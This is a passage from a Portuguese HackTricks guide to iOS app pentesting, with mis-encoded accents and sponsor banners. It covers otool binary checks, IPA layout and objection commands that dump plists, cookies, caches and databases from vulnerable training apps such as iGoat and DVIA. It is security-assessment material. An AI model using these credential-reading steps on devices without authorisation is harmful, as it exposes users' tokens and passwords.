# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Fundamentos do iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Ambiente de Teste

Nesta p√°gina, voc√™ pode encontrar informa√ß√µes sobre o **simulador do iOS**, **emuladores** e **jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## An√°lise Inicial

### Opera√ß√µes B√°sicas de Teste no iOS

Durante o teste, **ser√£o sugeridas v√°rias opera√ß√µes** (conectar ao dispositivo, ler/escrever/upload/download de arquivos, usar algumas ferramentas...). Portanto, se voc√™ n√£o sabe como realizar alguma dessas a√ß√µes, por favor, **comece lendo a p√°gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para os pr√≥ximos passos, **o aplicativo deve estar instalado** no dispositivo e voc√™ deve ter obtido o arquivo **IPA** do aplicativo.\
Leia a p√°gina [Opera√ß√µes B√°sicas de Teste no iOS](basic-ios-testing-operations.md) para aprender como fazer isso.
{% endhint %}

### An√°lise Est√°tica B√°sica

√â recomendado usar a ferramenta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar uma An√°lise Est√°tica autom√°tica do arquivo IPA.

Identifica√ß√£o de **prote√ß√µes presentes no bin√°rio**:

*   **PIE (Executable Independente de Posi√ß√£o)**: Quando ativado, o aplicativo √© carregado em um endere√ßo de mem√≥ria aleat√≥rio toda vez que √© iniciado, tornando mais dif√≠cil prever seu endere√ßo de mem√≥ria inicial.

```bash
otool -hv <app-binary> | grep PIE   # Deve incluir a flag PIE
```
*   **Can√°rios de Pilha**: Para validar a integridade da pilha, um valor 'can√°rio' √© colocado na pilha antes de chamar uma fun√ß√£o e √© validado novamente uma vez que a fun√ß√£o termina.

```bash
otool -I -v <app-binary> | grep stack_chk   # Deve incluir os s√≠mbolos: stack_chk_guard e stack_chk_fail
```
*   **ARC (Contagem Autom√°tica de Refer√™ncias)**: Para prevenir falhas comuns de corrup√ß√£o de mem√≥ria

```bash
otool -I -v <app-binary> | grep objc_release   # Deve incluir o s√≠mbolo _objc_release
```
*   **Bin√°rio Criptografado**: O bin√°rio deve ser criptografado

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # O cryptid deve ser 1
```

**Identifica√ß√£o de Fun√ß√µes Sens√≠veis/Inseguras**

*   **Algoritmos de Hash Fracos**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# No linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fun√ß√µes Aleat√≥rias Inseguras**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# No linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fun√ß√£o ‚ÄòMalloc‚Äô Insegura**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# No linux
grep -iER "_malloc"
```
*   **Fun√ß√µes Inseguras e Vulner√°veis**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# No linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### An√°lise Din√¢mica B√°sica

Confira a an√°lise din√¢mica que o [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) realiza. Voc√™ precisar√° navegar pelas diferentes visualiza√ß√µes e interagir com elas, mas ele estar√° interceptando v√°rias classes e fazendo outras coisas, e preparar√° um relat√≥rio quando voc√™ terminar.

### Listando Aplicativos Instalados

Ao mirar aplicativos que est√£o instalados no dispositivo, voc√™ primeiro ter√° que descobrir o identificador de pacote correto do aplicativo que deseja analisar. Voc√™ pode usar `frida-ps -Uai` para obter todos os aplicativos (`-a`) atualmente instalados (`-i`) no dispositivo USB conectado (`-U`):
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumera√ß√£o B√°sica & Hooking

Aprenda a **enumerar os componentes da aplica√ß√£o** e como **enganchar m√©todos e classes** facilmente com objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estrutura do IPA

Arquivos `.ipa` s√£o **pacotes compactados**, ent√£o voc√™ pode mudar a extens√£o para `.zip` e **descompact√°-los**. Uma aplica√ß√£o **completa** **empacotada** pronta para ser instalada √© comumente referida como **Bundle**.\
Ap√≥s descompact√°-los, voc√™ deve ver `<NAME>.app`, um arquivo compactado que cont√©m o restante dos recursos.

* `Info.plist`: Um arquivo que cont√©m algumas das configura√ß√µes espec√≠ficas da aplica√ß√£o.
* `_CodeSignature/` cont√©m um arquivo plist com uma assinatura sobre todos os arquivos no bundle.
* `Assets.car`: Outro arquivo compactado que cont√©m ativos (√≠cones).
* `Frameworks/` cont√©m as bibliotecas nativas da aplica√ß√£o como arquivos .dylib ou .framework.
* `PlugIns/` pode conter extens√µes da aplica√ß√£o como arquivos .appex (n√£o presente no exemplo).
* [`Core Data`](https://developer.apple.com/documentation/coredata): √â usado para salvar os dados permanentes da sua aplica√ß√£o para uso offline, para armazenar dados tempor√°rios e para adicionar funcionalidade de desfazer √† sua aplica√ß√£o em um √∫nico dispositivo. Para sincronizar dados entre v√°rios dispositivos em uma √∫nica conta iCloud, o Core Data espelha automaticamente seu esquema para um cont√™iner CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): O arquivo `PkgInfo` √© uma maneira alternativa de especificar os c√≥digos de tipo e criador da sua aplica√ß√£o ou bundle.
* **en.lproj, fr.proj, Base.lproj**: S√£o os pacotes de idiomas que cont√™m recursos para esses idiomas espec√≠ficos e um recurso padr√£o caso um idioma n√£o seja suportado.

Existem v√°rias maneiras de definir a UI em uma aplica√ß√£o iOS: arquivos _storyboard_, _nib_ ou _xib_.

**Info.plist**

A lista de propriedades de informa√ß√£o ou `Info.plist` √© a principal fonte de informa√ß√£o para um aplicativo iOS. Consiste em um arquivo estruturado contendo pares **chave-valor** que descrevem informa√ß√µes essenciais de configura√ß√£o sobre o aplicativo. Na verdade, espera-se que todos os execut√°veis empacotados (extens√µes de aplicativos, frameworks e aplicativos) tenham um arquivo `Info.plist`. Voc√™ pode encontrar todas as chaves poss√≠veis na [**Documenta√ß√£o do Desenvolvedor da Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

O arquivo pode ser formatado em **XML ou bin√°rio (bplist)**. Voc√™ pode **convert√™-lo para o formato XML** com um comando simples:

*   No macOS com `plutil`, que √© uma ferramenta que vem nativamente com o macOS 10.2 e vers√µes superiores (atualmente n√£o h√° documenta√ß√£o oficial dispon√≠vel online):

```bash
$ plutil -convert xml1 Info.plist
```
*   No Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Aqui est√° uma lista n√£o exaustiva de algumas informa√ß√µes e as palavras-chave correspondentes que voc√™ pode facilmente procurar no arquivo `Info.plist` apenas inspecionando o arquivo ou usando `grep -i <keyword> Info.plist`:

* Strings de Prop√≥sito de Permiss√µes de Aplicativo: `UsageDescription`
* Esquemas de URL personalizados: `CFBundleURLTypes`
* Tipos de documentos personalizados exportados/importados: `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configura√ß√£o de Seguran√ßa de Transporte de Aplicativo (ATS): `NSAppTransportSecurity`

Por favor, consulte os cap√≠tulos mencionados para aprender mais sobre como testar cada um desses pontos.

**Caminhos de Dados**

No iOS, **aplica√ß√µes do sistema podem ser encontradas no diret√≥rio `/Applications`** enquanto aplicativos **instalados pelo usu√°rio** est√£o dispon√≠veis em **`/private/var/containers/`**. No entanto, encontrar a pasta certa apenas navegando pelo sistema de arquivos n√£o √© uma tarefa trivial, pois **cada aplicativo recebe um UUID (Identificador √önico Universal) de 128 bits aleat√≥rio** atribu√≠do para os nomes de seus diret√≥rios.

Para obter facilmente as informa√ß√µes do diret√≥rio de instala√ß√£o para aplicativos instalados pelo usu√°rio, voc√™ pode usar o comando **`env` do objection** que tamb√©m mostrar√° todas as informa√ß√µes do diret√≥rio do aplicativo:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Voc√™ tamb√©m pode procurar pelo nome do aplicativo dentro de **`/private/var/containers`**:
```bash
find /private/var/containers -name "Progname*"
```
Ou usando **`ps`** e **`lsof`**:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
Como voc√™ pode ver, os aplicativos t√™m duas localiza√ß√µes principais:

* O **diret√≥rio Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* O **diret√≥rio de Dados** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Essas pastas cont√™m informa√ß√µes que devem ser examinadas cuidadosamente durante avalia√ß√µes de seguran√ßa de aplicativos (por exemplo, ao analisar os dados armazenados em busca de dados sens√≠veis).

**Diret√≥rio Bundle:**

* **AppName.app**
* Este √© o Bundle do Aplicativo como visto anteriormente no IPA, cont√©m dados essenciais do aplicativo, conte√∫do est√°tico, bem como o bin√°rio compilado do aplicativo.
* Este diret√≥rio √© vis√≠vel para os usu√°rios, mas **usu√°rios n√£o podem escrever nele**.
* O conte√∫do deste diret√≥rio **n√£o √© feito backup**.
* Os conte√∫dos desta pasta s√£o usados para **validar a assinatura do c√≥digo**.

**Diret√≥rio de Dados:**

* **Documents/**
* Cont√©m todos os dados gerados pelo usu√°rio. O usu√°rio final do aplicativo inicia a cria√ß√£o desses dados.
* Vis√≠vel para os usu√°rios e **usu√°rios podem escrever nele**.
* O conte√∫do deste diret√≥rio **√© feito backup**.
* O aplicativo pode desativar caminhos definindo `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Cont√©m todos os **arquivos que n√£o s√£o espec√≠ficos do usu√°rio**, como **caches**, **prefer√™ncias**, **cookies** e arquivos de configura√ß√£o de lista de propriedades (plist).
* Aplicativos iOS geralmente usam os subdiret√≥rios `Application Support` e `Caches`, mas o aplicativo pode criar subdiret√≥rios personalizados.
* **Library/Caches/**
* Cont√©m **arquivos de cache semi-persistentes**.
* Invis√≠vel para os usu√°rios e **usu√°rios n√£o podem escrever nele**.
* O conte√∫do deste diret√≥rio **n√£o √© feito backup**.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o aplicativo n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.
* **Library/Application Support/**
* Cont√©m **arquivos persistentes** necess√°rios para a execu√ß√£o do aplicativo.
* **Invis√≠vel** para **usu√°rios** e usu√°rios n√£o podem escrever nele.
* O conte√∫do deste diret√≥rio **√© feito backup**.
* O aplicativo pode desativar caminhos definindo `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Usado para armazenar propriedades que podem **persistir mesmo ap√≥s o rein√≠cio de um aplicativo**.
* As informa√ß√µes s√£o salvas, n√£o criptografadas, dentro do sandbox do aplicativo em um arquivo plist chamado \[BUNDLE\_ID].plist.
* Todos os pares chave/valor armazenados usando `NSUserDefaults` podem ser encontrados neste arquivo.
* **tmp/**
* Use este diret√≥rio para escrever **arquivos tempor√°rios** que n√£o precisam persistir entre os lan√ßamentos do aplicativo.
* Cont√©m arquivos de cache n√£o persistentes.
* **Invis√≠vel** para os usu√°rios.
* O conte√∫do deste diret√≥rio n√£o √© feito backup.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o aplicativo n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.

Vamos dar uma olhada mais de perto no diret√≥rio Bundle do Aplicativo iGoat-Swift (.app) dentro do diret√≥rio Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Revers√£o de Bin√°rio

Dentro da pasta `<application-name>.app`, voc√™ encontrar√° um arquivo bin√°rio chamado `<application-name>`. Este √© o arquivo que ser√° **executado**. Voc√™ pode realizar uma inspe√ß√£o b√°sica do bin√°rio com a ferramenta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Verifique se o aplicativo est√° criptografado**

Veja se h√° alguma sa√≠da para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desmontando o bin√°rio**

Desmonte a se√ß√£o de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir o **segmento Objective-C** do aplicativo de exemplo, pode-se usar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obter um c√≥digo Objective-C mais compacto, voc√™ pode usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
No entanto, as melhores op√ß√µes para desmontar o bin√°rio s√£o: [**Hopper**](https://www.hopperapp.com/download.html?) e [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas **ferramentas comunit√°rias mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Armazenamento de Dados

Para aprender sobre como o iOS armazena dados no dispositivo, leia esta p√°gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Os seguintes locais para armazenar informa√ß√µes devem ser verificados **imediatamente ap√≥s a instala√ß√£o do aplicativo**, **ap√≥s verificar todas as funcionalidades** do aplicativo e at√© mesmo ap√≥s **sair de um usu√°rio e entrar em outro diferente**.\
O objetivo √© encontrar **informa√ß√µes sens√≠veis desprotegidas** do aplicativo (senhas, tokens), do usu√°rio atual e de usu√°rios previamente logados.
{% endhint %}

### Plist

Arquivos **plist** s√£o arquivos XML estruturados que **cont√™m pares chave-valor**. √â uma maneira de armazenar dados persistentes, ent√£o √†s vezes voc√™ pode encontrar **informa√ß√µes sens√≠veis nesses arquivos**. √â recomendado verificar esses arquivos ap√≥s instalar o aplicativo e ap√≥s us√°-lo intensivamente para ver se novos dados s√£o escritos.

A maneira mais comum de persistir dados em arquivos plist √© atrav√©s do uso de **NSUserDefaults**. Este arquivo plist √© salvo dentro do sandbox do aplicativo em **`Library/Preferences/<appBundleID>.plist`**

A classe [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) fornece uma interface program√°tica para interagir com o sistema padr√£o. O sistema padr√£o permite que um aplicativo personalize seu comportamento de acordo com **prefer√™ncias do usu√°rio**. Dados salvos pelo `NSUserDefaults` podem ser visualizados no pacote do aplicativo. Esta classe armazena **dados** em um arquivo **plist**, mas √© destinada a ser usada com pequenas quantidades de dados.

Esses dados n√£o podem mais ser acessados diretamente via um computador confi√°vel, mas podem ser acessados realizando um **backup**.

Voc√™ pode **despejar** as informa√ß√µes salvas usando **`NSUserDefaults`** usando o comando `ios nsuserdefaults get` do objection.

Para encontrar todos os plist usados pelo aplicativo, voc√™ pode acessar `/private/var/mobile/Containers/Data/Application/{APPID}` e executar:
```bash
find ./ -name "*.plist"
```
O arquivo pode estar formatado em **XML ou bin√°rio (bplist)**. Voc√™ pode **converti-lo para o formato XML** com um comando simples:

*   No macOS com `plutil`, que √© uma ferramenta que vem nativamente com o macOS 10.2 e vers√µes superiores (nenhuma documenta√ß√£o oficial online est√° dispon√≠vel no momento):

```bash
$ plutil -convert xml1 Info.plist
```
*   No Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   Em uma sess√£o de objection:

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) √© um framework para gerenciar a camada de modelo de objetos em sua aplica√ß√£o. [Core Data pode usar SQLite como seu armazenamento persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), mas o pr√≥prio framework n√£o √© um banco de dados.\
CoreData n√£o criptografa seus dados por padr√£o. No entanto, uma camada adicional de criptografia pode ser adicionada ao CoreData. Veja o [Reposit√≥rio GitHub](https://github.com/project-imas/encrypted-core-data) para mais detalhes.

Voc√™ pode encontrar as informa√ß√µes do Core Data SQLite de uma aplica√ß√£o no caminho `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Se voc√™ conseguir abrir o SQLite e acessar informa√ß√µes sens√≠veis, ent√£o voc√™ encontrou uma m√° configura√ß√£o.**

{% code title="C√≥digo do iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) √© um armazenamento de chave/valor constru√≠do em cima do SQLite.\
Como os bancos de dados Yap s√£o bancos de dados sqlite, voc√™ pode encontr√°-los usando o comando sugerido na se√ß√£o anterior.

### Outros Bancos de Dados SQLite

√â comum que aplica√ß√µes criem seu pr√≥prio banco de dados sqlite. Eles podem estar **armazenando** **dados** **sens√≠veis** neles e deixando-os sem criptografia. Portanto, √© sempre interessante verificar cada banco de dados dentro do diret√≥rio de aplica√ß√µes. Para isso, v√° at√© o diret√≥rio da aplica√ß√£o onde os dados s√£o salvos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de Dados Firebase em Tempo Real

Podem ser utilizadas por desenvolvedores de aplicativos para **armazenar e sincronizar dados com um banco de dados hospedado na nuvem NoSQL**. Os dados s√£o armazenados como JSON e s√£o sincronizados em tempo real com todos os clientes conectados e tamb√©m permanecem dispon√≠veis mesmo quando o aplicativo fica offline.

Voc√™ pode encontrar como verificar bases de dados Firebase mal configuradas aqui:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de Dados Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) e [Realm Swift](https://realm.io/docs/swift/latest/) n√£o s√£o fornecidos pela Apple, mas ainda assim s√£o importantes de se notar. Eles **armazenam tudo sem criptografia, a menos que a configura√ß√£o tenha a criptografia ativada**.

Voc√™ pode encontrar estas bases de dados em `/private/var/mobile/Containers/Data/Application/{APPID}`
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Voc√™ pode usar a ferramenta [**Realm Studio**](https://github.com/realm/realm-studio) para abrir esses arquivos de banco de dados.

O exemplo a seguir demonstra como usar criptografia com um banco de dados Realm:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de Dados Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) √© um motor de base de dados leve, embutido e orientado a documentos (NoSQL) que pode ser sincronizado. Compila nativamente para iOS e macOS.

Verifique poss√≠veis bases de dados couchbase em `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

O iOS armazena os cookies dos aplicativos no **`Library/Cookies/cookies.binarycookies`** dentro de cada pasta de aplicativos. No entanto, desenvolvedores √†s vezes optam por salv√°-los no **keychain**, pois o mencionado **arquivo de cookies pode ser acessado em backups**.

Para inspecionar o arquivo de cookies, voc√™ pode usar [**este script python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ou usar o comando do objection **`ios cookies get`.**\
**Voc√™ tamb√©m pode usar o objection para** converter esses arquivos para um formato JSON e inspecionar os dados.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Por padr√£o, NSURLSession armazena dados, como **requisi√ß√µes e respostas HTTP no banco de dados Cache.db**. Este banco de dados pode conter **dados sens√≠veis**, se tokens, nomes de usu√°rio ou qualquer outra informa√ß√£o sens√≠vel foram armazenados em cache. Para encontrar as informa√ß√µes em cache, abra o diret√≥rio de dados do aplicativo (`/var/mobile/Containers/Data/Application/<UUID>`) e v√° para `/Library/Caches/<Bundle Identifier>`. O **cache do WebKit tamb√©m √© armazenado no arquivo Cache.db**. **Objection** pode abrir e interagir com o banco de dados com o comando `sqlite connect Cache.db`, pois √© um **banco de dados SQLite normal**.

√â **recomendado desativar o armazenamento em cache desses dados**, pois eles podem conter informa√ß√µes sens√≠veis na requisi√ß√£o ou resposta. A lista a seguir mostra diferentes maneiras de conseguir isso:

1. √â recomendado remover as respostas armazenadas em cache ap√≥s o logout. Isso pode ser feito com o m√©todo fornecido pela Apple chamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Voc√™ pode chamar este m√©todo da seguinte forma:

`URLCache.shared.removeAllCachedResponses()`

Este m√©todo remover√° todas as requisi√ß√µes e respostas armazenadas em cache do arquivo Cache.db.
2. Se voc√™ n√£o precisa usar a vantagem dos cookies, seria recomendado usar apenas a propriedade de configura√ß√£o [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, que desativar√° o salvamento de cookies e caches.

[Documenta√ß√£o da Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Um objeto de configura√ß√£o de sess√£o ef√™mera √© semelhante a uma configura√ß√£o de sess√£o padr√£o (veja default), exceto que o objeto de sess√£o correspondente n√£o armazena caches, lojas de credenciais ou quaisquer dados relacionados √† sess√£o em disco. Em vez disso, os dados relacionados √† sess√£o s√£o armazenados em RAM. A √∫nica vez que uma sess√£o ef√™mera grava dados em disco √© quando voc√™ a instrui a escrever o conte√∫do de uma URL em um arquivo.`
3. O cache tamb√©m pode ser desativado definindo a Pol√≠tica de Cache para [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Isso desativar√° o armazenamento de cache de qualquer forma, seja na mem√≥ria ou no disco.

### Snapshots

Sempre que voc√™ pressiona o bot√£o home, o iOS **tira um snapshot da tela atual** para poder fazer a transi√ß√£o para o aplicativo de uma maneira muito mais suave. No entanto, se **dados sens√≠veis** estiverem presentes na tela atual, eles ser√£o **salvos** na **imagem** (que **persiste** **atrav√©s de** **reinicializa√ß√µes**). Estes s√£o os snapshots que voc√™ tamb√©m pode acessar ao tocar duas vezes no bot√£o home para alternar entre aplicativos.

A menos que o iPhone esteja com jailbreak, o **atacante** precisa ter **acesso** ao **dispositivo** **desbloqueado** para ver essas capturas de tela. Por padr√£o, o √∫ltimo snapshot √© armazenado na sandbox do aplicativo em `Library/Caches/Snapshots/` ou `Library/SplashBoard/Snapshots` (os computadores confi√°veis n√£o podem acessar o sistema de arquivos a partir do iOS 7.0).

Uma maneira de prevenir esse comportamento indesejado √© colocar uma tela em branco ou remover os dados sens√≠veis antes de tirar o snapshot usando a fun√ß√£o `ApplicationDidEnterBackground()`.

A seguir, um m√©todo de remedia√ß√£o de exemplo que definir√° um screenshot padr√£o.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
